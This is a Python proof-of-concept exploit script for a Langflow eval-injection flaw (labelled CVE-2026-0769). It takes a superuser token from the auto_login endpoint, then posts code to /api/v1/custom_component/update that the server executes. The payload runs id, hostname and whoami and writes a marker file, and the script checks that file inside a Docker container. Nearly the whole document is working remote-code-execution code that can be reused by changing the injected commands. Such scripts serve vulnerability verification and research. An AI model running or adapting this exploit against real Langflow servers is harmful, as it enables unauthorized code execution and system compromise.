#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Langflow Eval Injection RCE — Vector 3 (Update Endpoint)
# CVE            : CVE-2026-0769
# Vendor         : langflow-ai
# Product        : Langflow
# Affected       : 1.0.0 through 1.8.0 (latest)
# Type           : CWE-95 - Eval Injection
# CVSS           : 9.8 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-01-23
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-0769 Vector 3: /custom_component/update Endpoint RCE

Demonstrates RCE via the ALTERNATIVE endpoint /api/v1/custom_component/update.
Same code execution chain as /api/v1/custom_component but a separate entry point.

ATTACK CHAIN:
  1. GET /api/v1/auto_login → obtain superuser JWT
  2. POST /api/v1/custom_component/update with malicious code
  3. build_custom_component_template() → eval_custom_component_code() → exec()

PREREQUISITES:
  - Target running Langflow 1.0.0–1.8.0 with AUTO_LOGIN=True (default)
  - Network access to port 7860

REFERENCES:
  - CVE-2026-0769
  - https://www.zerodayinitiative.com/advisories/ZDI-26-035/
"""

import json
import sys
import urllib.request
import urllib.error
import uuid
import subprocess
import time

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 7860
MARKER = "CVE-2026-0769-UPDATE-" + uuid.uuid4().hex[:8]
MARKER_FILE = "/tmp/cve-2026-0769-update-marker"


def get_auth_token(base_url):
    """Obtain superuser JWT via auto_login."""
    url = base_url + "/api/v1/auto_login"
    req = urllib.request.Request(url, method="GET")
    with urllib.request.urlopen(req, timeout=15) as resp:
        data = json.loads(resp.read().decode())
        return data["access_token"]


def exploit(target_host, target_port, container_name="cve-2026-0769-vulnerable"):
    """
    Exploit CVE-2026-0769 via /api/v1/custom_component/update endpoint.

    This endpoint accepts an UpdateCustomComponentRequest which includes
    a 'code' field. The code goes through the same eval chain:
    build_custom_component_template() -> get_component_instance() ->
    eval_custom_component_code() -> create_class() -> exec()
    """
    base_url = "http://" + target_host + ":" + str(target_port)

    print("=" * 60)
    print("  CVE-2026-0769 Vector 3: /custom_component/update RCE")
    print("  Target: " + base_url)
    print("  Endpoint: POST /api/v1/custom_component/update")
    print("=" * 60)
    print()

    # Step 1: Auth
    print("[*] Getting auth token...")
    token = get_auth_token(base_url)
    print("[+] Got token: " + token[:40] + "...")

    # Step 2: Build payload - module level exec via assignment statements
    payload_code = (
        "import os\n"
        "import subprocess\n"
        "\n"
        "_rce_marker = open(\"" + MARKER_FILE + "\", \"w\").write(\n"
        "    \"" + MARKER + "\\n\"\n"
        "    \"endpoint: /api/v1/custom_component/update\\n\"\n"
        "    \"id: \" + subprocess.check_output([\"id\"], text=True).strip() + \"\\n\"\n"
        "    \"hostname: \" + subprocess.check_output([\"hostname\"], text=True).strip() + \"\\n\"\n"
        "    \"whoami: \" + subprocess.check_output([\"whoami\"], text=True).strip() + \"\\n\"\n"
        ")\n"
        "\n"
        "from langflow.custom import Component\n"
        "from langflow.io import Output\n"
        "\n"
        "class UpdateExploit(Component):\n"
        "    display_name = \"Update Exploit\"\n"
        "    description = \"RCE via update endpoint\"\n"
        "    outputs = [Output(name=\"output\", display_name=\"Output\", method=\"run\")]\n"
        "    def run(self) -> str:\n"
        "        return \"exploited\"\n"
    )

    print("[*] Sending exploit to /api/v1/custom_component/update...")
    print("[*] Marker: " + MARKER)

    # The update endpoint expects a slightly different request body
    # It needs 'code' and may accept additional fields like 'template'
    body = json.dumps({
        "code": payload_code,
        "template": {},
        "field": "code"
    }).encode("utf-8")

    headers = {
        "Authorization": "Bearer " + token,
        "Content-Type": "application/json",
    }

    url = base_url + "/api/v1/custom_component/update"
    try:
        req = urllib.request.Request(url, data=body, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=30) as resp:
            print("[+] HTTP " + str(resp.status) + " response received")
    except urllib.error.HTTPError as e:
        resp_body = e.read().decode()
        print("[!] HTTP " + str(e.code) + ": " + str(e.reason))
        print("[!] Response: " + resp_body[:300])
        # Code may still have executed before the error

    # Step 3: Verify
    time.sleep(0.5)
    print("[*] Verifying exploitation...")
    result = subprocess.run(
        ["docker", "exec", container_name, "cat", MARKER_FILE],
        capture_output=True, text=True, timeout=10
    )

    if result.returncode == 0 and MARKER in result.stdout:
        print("[+] =============================================")
        print("[+]  CONFIRMED: /custom_component/update is also vulnerable!")
        print("[+] =============================================")
        for line in result.stdout.strip().split("\n"):
            print("[+] " + line)
        subprocess.run(["docker", "exec", container_name, "rm", "-f", MARKER_FILE],
                       capture_output=True, timeout=5)
        return True
    else:
        print("[-] Exploitation via update endpoint not confirmed")
        print("[-] stderr: " + result.stderr.strip())
        return False


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    container = sys.argv[3] if len(sys.argv) > 3 else "cve-2026-0769-vulnerable"
    success = exploit(target, port, container)
    sys.exit(0 if success else 1)
